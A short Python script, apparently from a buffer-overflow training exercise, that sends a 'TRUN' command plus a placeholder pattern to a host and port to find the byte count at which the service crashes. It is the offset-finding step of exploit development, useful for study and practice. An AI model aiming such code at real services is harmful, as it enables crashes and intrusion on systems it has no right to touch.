#!/usr/bin/env python3

import sys, socket
from time import sleep

ip='<ip>'
port=<port>

buffer=b'<pattern>'

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(5)   # 5 seconds
    s.connect((ip, port))
    s.send(b'TRUN ./:/'+buffer)
    s.recv(1024)
    print('Sending {} bytes'.format(str(len(buffer))))
    s.close()
    sleep(1)
except OSError as e:
    print('Crashed at {} bytes'.format(str(len(buffer))))
    sys.exit()
